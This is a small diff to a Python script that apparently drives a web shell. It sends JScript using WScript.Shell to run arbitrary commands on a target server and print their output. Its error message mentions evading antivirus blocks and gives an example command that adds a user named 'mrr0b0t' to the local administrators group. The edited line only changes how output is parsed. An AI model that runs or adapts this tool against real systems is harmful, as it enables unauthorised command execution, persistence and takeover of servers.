@@ -23,7 +23,7 @@ try:
 			shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
 			shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
 			if shell_req.status_code == 200:
-				print(shell_req.text.split('!BDNp')[0])
+				print(shell_req.text.split('!BD')[0])
 			elif shell_req.status_code == 500:
 				print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
 			else:
